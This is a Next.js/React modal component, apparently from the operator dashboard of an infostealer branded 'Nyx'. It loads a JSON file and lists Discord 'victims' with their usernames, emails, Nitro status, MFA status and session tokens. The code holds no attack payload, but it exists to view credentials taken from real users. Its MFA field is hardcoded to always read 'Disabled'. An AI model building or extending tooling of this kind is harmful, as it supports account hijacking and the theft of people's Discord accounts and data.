"use client";
import { useState } from "react";
import Image from "next/image";
import logo from "@/assets/logo.png";
import Data6 from "@/data/teste-discord.json";

interface DiscordData {
  id: number;
  victim: string;
  username: string;
  email: string;
  nitro: boolean;
  token: string;
  profile_image: string;
}
const dc: DiscordData[] = Data6;

export default function ModalDiscord() {
  const [isDiscordOpen, setIsDiscordOpen] = useState<boolean>(false);

  const handleCloseDiscord = () => {
    setIsDiscordOpen(false);
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50">
      <div className="relative bg-zinc-900 p-6 rounded-lg text-white w-11/12 max-w-4xl h-4/5 overflow-y-auto shadow-lg border border-gray-700">
        {/* Background logo */}
        <div className="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none">
          <Image src={logo} alt="Nyx Logo" width={700} height={700} />
        </div>

        {/* Botão de fechar */}
        <button
          onClick={handleCloseDiscord}
          className="text-red-500  self-start text-xl focus:outline-none"
        >
          CLOSE
        </button>

        {/* Título */}
        <h1 className="text-3xl font-bold text-center mb-6">
          Discord Informations
        </h1>

        {/* Conteúdo */}
        <div className="space-y-4">
          {dc.map(
            ({ id, victim, username, email, nitro, token, profile_image }) => (
              <div
                className="grid grid-cols-2 gap-4 bg-zinc-800 p-4 rounded-md shadow-md"
                key={id}
              >
                <div className="flex items-center">
                  <img
                    src={profile_image}
                    alt="Profile"
                    className="w-16 h-16 rounded-full mr-4"
                  />
                  <div>
                    <p className="font-semibold">{victim}</p>
                    <p className="text-gray-400">{username}</p>
                  </div>
                </div>
                <div className="flex flex-col justify-center">
                  <div className="flex items-center">
                    <span className="mr-2 text-purple-400">Nitro:</span>
                    <span className="text-gray-300">
                      {nitro ? "Yes" : "No"}
                    </span>
                  </div>
                  <div className="flex items-center">
                    <span className="mr-2 text-purple-400">Email:</span>
                    <span className="text-gray-300">{email}</span>
                  </div>
                  <div className="flex items-center">
                    <span className="mr-2 text-purple-400">MFA:</span>
                    <span className="text-gray-300">
                      {false ? "Enabled" : "Disabled"}
                    </span>
                  </div>
                  <div className="flex items-center">
                    <span className="mr-2 text-purple-400">Token:</span>
                    <span className="text-gray-300">{token}</span>
                  </div>
                </div>
              </div>
            )
          )}
        </div>
      </div>
    </div>
  );
}
